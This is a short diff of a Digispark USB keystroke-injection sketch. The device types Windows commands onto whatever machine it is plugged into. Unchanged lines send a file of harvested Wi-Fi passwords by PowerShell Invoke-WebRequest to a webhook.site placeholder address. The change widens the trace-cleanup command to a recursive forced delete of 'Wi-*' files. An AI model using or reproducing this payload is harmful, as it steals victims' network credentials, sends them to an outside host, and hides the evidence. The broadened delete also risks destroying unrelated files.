@@ -25,7 +25,7 @@ void loop() {
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
   DigiKeyboard.delay(1000);  
-  DigiKeyboard.println("del Wi-Fi-* /s /f /q"); //cleaning up all the mess
+  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("exit");
   DigiKeyboard.delay(100);  
